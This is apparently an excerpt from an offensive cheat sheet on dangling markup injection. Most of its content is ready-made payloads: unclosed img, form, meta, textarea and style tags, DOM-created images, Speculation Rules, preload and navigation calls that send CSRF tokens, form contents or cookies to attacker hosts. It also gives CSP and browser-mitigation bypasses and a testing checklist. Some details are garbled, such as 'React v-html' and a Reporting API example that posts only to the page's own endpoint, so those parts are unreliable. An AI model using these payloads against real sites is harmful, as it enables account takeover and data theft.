...
Injected payload:
  <img src="https://test-attacker.com/collect?

Resulting HTML:
  <div>Hello <img src="https://test-attacker.com/collect?</div>
  <form>
    <input type="hidden" name="csrf" value="SECRET_TOKEN_123">
    <input type="text" name="email" value="user@target.com">
  </form>
...
The browser interprets everything from `https://test-attacker.com/collect?` until the next `"` as the URL. The hidden CSRF token and email value become part of the URL query string sent to `test-attacker.com`.
...
The browser sends a GET request to `test-attacker.com` with all consumed content as query parameters.
...
```html
<form action="https://test-attacker.com/collect">
...
- `<script src="/js/app.js">` → loads `https://test-attacker.com/js/app.js`
- `<a href="/profile">` → links to `https://test-attacker.com/profile`
- `<form action="/submit">` → submits to `https://test-attacker.com/submit`
...
```html
<meta http-equiv="refresh" content="0;url=https://test-attacker.com/collect?
```
...
```html
<link rel="stylesheet" href="https://test-attacker.com/collect?
```
...
```html
<table background="https://test-attacker.com/collect?
```
...
```html
<video poster="https://test-attacker.com/collect?
<audio src="https://test-attacker.com/collect?
```
...
`<form action="https://test-attacker.com/collect"><textarea name="data">` — unclosed textarea eats all subsequent HTML as plaintext; form submission sends it to attacker.

### 6.3 Comment / Style Dangling

- `<!-- ` without closing `-->` consumes all content (no exfil, but hides page content)
- `<style>` unclosed treats page as CSS; combine with `@import url("https://test-attacker.com/?` for exfil
...
```
1. Inject <img src="https://target.com/redirect?url=https://test-attacker.com/collect?
...
```
1. Inject <form action="https://test-attacker.com/collect"><textarea name="data">
...
│   ├── Inside attribute value? → Break out first: "><img src="https://test-attacker.com/collect?
│   ├── Inside tag content? → Inject directly: <img src="https://test-attacker.com/collect?
...
│   │   ├── DNS prefetch? → <link rel=dns-prefetch href="//data.test-attacker.com">
...
7. **DNS prefetch exfiltration works even under strict CSP**: `<link rel=dns-prefetch href="//stolen-data.test-attacker.com">` triggers a DNS lookup that CSP cannot block. Limited to ~253 characters per label, but sufficient for tokens.

---

## 11. 2026 EMERGING TECHNIQUES

### 11.1 Chrome/Safari/Firefox 2026 Mitigation Changes

#### Chrome 130+ — Dangling Markup Mitigation Extensions

Chrome extended its dangling markup mitigation (introduced in Chrome 60) to cover additional contexts in 2025-2026:

| Chrome Version | New Mitigation |
|---|---|
| Chrome 125+ | Blocks `<img src=` with `\n`, `\r`, or `<` in URL across all contexts |
| Chrome 130+ | Extends block to `<source srcset=` and `<picture>` elements |
| Chrome 135+ | Blocks `<video poster=` with `<` in URL value |
| Chrome 140+ | Adds `<link rel=preload href=` to the mitigation list |

**2026 bypass**: Chrome's mitigation only applies to **parser-inserted** elements. JavaScript-created elements via `document.createElement()` are NOT subject to the mitigation:

```html
<!-- Bypass: use DOM API to create the dangling markup element -->
<script>
  // If there's any script execution (even limited), create img via DOM
  var img = document.createElement('img');
  img.src = 'https://attacker.com/collect?' + document.querySelector('[name=csrf]').value;
  document.body.appendChild(img);
</script>
```

#### Firefox — Still Permissive

Firefox in 2026 still allows dangling markup in image sources with newlines. Firefox's HTML parser handles attribute values differently:

```html
<!-- Works in Firefox 2026, blocked in Chrome -->
<img src="https://attacker.com/collect?
  csrf=SECRET_TOKEN
  &user=admin">
```

### 11.2 Dangling Markup in SPA Frameworks

Modern Single Page Applications (React, Vue, Angular, Svelte) render content client-side, which changes dangling markup dynamics:

#### React 19 — dangerouslySetInnerHTML

```jsx
// React 19: dangling markup via dangerouslySetInnerHTML
// When CSP blocks inline scripts but allows HTML injection:
<div dangerouslySetInnerHTML={{
  __html: '<img src="https://attacker.com/collect?' 
}} />
// React does NOT sanitize dangling markup — it relies on the browser's mitigation
// In Firefox: the unclosed src captures subsequent DOM content
```

#### Vue 3 — v-html

```html
<!-- Vue 3: v-html renders raw HTML -->
<div v-html="userContent"></div>
<!-- If userContent = '<img src="https://attacker.com/collect?' -->
<!-- The unclosed attribute captures subsequent Vue-rendered content -->
```

#### Angular — DomSanitizer Bypass

```typescript
// Angular: bypassSecurityTrustHtml allows dangling markup
...
### 11.3 Dangling Markup via Web Components

Web Components with Shadow DOM create new dangling markup surfaces:

```html
<!-- Web Component with user-controlled content in shadow DOM -->
<custom-card>
  <span slot="title">USER_INPUT_HERE</span>
</custom-card>

<!-- If USER_INPUT is: <img src="https://attacker.com/collect? -->
<!-- The dangling markup captures content within the shadow DOM,
    including potentially sensitive slot content from other components -->

<!-- Bypass: Shadow DOM encapsulation may PREVENT some CSP rules
    from applying to the shadow tree, depending on the CSP directive -->
```

### 11.4 New Exfiltration Channels Under Strict CSP (2026)

#### Speculation Rules API (Chrome 122+)

```html
<!-- Speculation Rules API: not covered by CSP in 2026 -->
<script type="speculationrules">
{
  "prerender": [{
    "source": "list",
    "urls": ["https://attacker.com/collect?token=SECRET_CSRF_TOKEN"]
  }]
}
</script>
<!-- Chrome preconnects/prerenders the URL, leaking data via the URL path -->
<!-- CSP does not regulate speculation rules in Chrome 140 -->
```

#### Fetch Priority API + Preload

```html
<!-- Fetch Priority API: not blocked by CSP default-src -->
<link rel="preload" href="https://attacker.com/collect?data=SECRET" as="fetch" fetchpriority="high">
<!-- If 'as' matches an allowed CSP directive (e.g., connect-src), the request goes through -->
```

#### Reporting API Exfiltration

```html
<!-- Reporting API: CSP-compliant data exfiltration channel -->
<script>
  // The Reporting API sends POST to a configured endpoint
  // If attacker can set the report-to header via CRLF or meta tag:
  fetch('/report', {
    method: 'POST',
    headers: { 'Content-Type': 'application/reports+json' },
    body: JSON.stringify([{
      type: 'csp-violation',
      url: 'https://attacker.com/collect?' + document.cookie,
      body: { documentURL: document.location.href }
    }])
  });
</script>
```

#### Navigation API (Chrome 120+)

```html
<!-- Navigation API: navigate() may bypass CSP navigate-to -->
<script>
  navigation.navigate('https://attacker.com/collect?' + document.querySelector('[name=csrf]').value);
</script>
<!-- Not all CSP implementations check Navigation API in 2026 -->
```

### 11.5 Dangling Markup in Email Clients (2026)

Modern email clients (Outlook Web, Gmail, Apple Mail) render limited HTML. Dangling markup in email contexts:

#### Outlook Web — mso: Conditional Comments

```html
<!-- Outlook Web: conditional comments can create dangling markup -->
<!--[if gte mso 9]>
<img src="https://attacker.com/collect?
<![endif]-->
<!-- The conditional comment may leave the src attribute unclosed in certain Outlook versions -->
```

#### Gmail — CSS Exfiltration

```html
<!-- Gmail strips <script> but allows limited CSS -->
<style>
  .secret[data-value^="a"] { background: url('https://attacker.com/?char=a'); }
  .secret[data-value^="b"] { background: url('https://attacker.com/?char=b'); }
</style>
<div class="secret" data-value="SECRET_TOKEN"></div>
<!-- Gmail's CSS sanitization in 2026 still allows attribute selectors -->
```

### 11.6 2026 Dangling Markup Decision Matrix

| Scenario | Chrome 140+ | Firefox 2026 | Safari 2026 |
|---|---|---|---|
| `<img src="attacker?` | Blocked (parser) | Allowed | Blocked |
| `<form action="attacker?` | Allowed | Allowed | Allowed |
| `<base href="attacker?` | Allowed | Allowed | Allowed |
| `<link rel=preload href="attacker?` | Blocked (v140+) | Allowed | Allowed |
| DOM-created `<img>` | Allowed (bypass) | Allowed | Allowed |
| Speculation Rules | Allowed (no CSP) | N/A | N/A |
| `<source srcset="attacker?` | Blocked (v130+) | Allowed | Blocked |
| `<video poster="attacker?` | Blocked (v135+) | Allowed | Allowed |

### 11.7 2026 Dangling Markup Testing Checklist

```
□ Test in Firefox (most permissive) — if it works there, check Chrome/Safari
□ Try DOM-created elements to bypass Chrome parser-level mitigation
□ Test Speculation Rules API for CSP-compliant exfiltration
□ Check Navigation API (navigation.navigate) for CSP bypass
□ Test in SPA frameworks: React v-html, Vue v-html, Angular bypassSecurityTrustHtml
□ Examine Web Components shadow DOM for CSP coverage gaps
□ Test email client CSS attribute selectors for data exfiltration
□ Try Reporting API as a data exfiltration channel
□ Check Fetch Priority + preload for CSP directive confusion
```
